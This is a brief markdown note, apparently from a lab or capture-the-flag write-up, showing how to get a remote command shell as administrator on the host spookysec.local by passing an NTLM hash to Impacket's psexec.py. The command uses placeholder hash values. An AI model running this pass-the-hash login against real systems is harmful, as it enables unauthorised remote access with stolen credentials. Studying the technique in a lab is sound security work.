# PSExec

## Log in with PsExec by "Passing the hash"

Note that this is not a vulnerability, this is how NTLM works

```bash
psexec.py -hashes PUT_THE:HASH_HERE administrator@spookysec.local
get cmd
```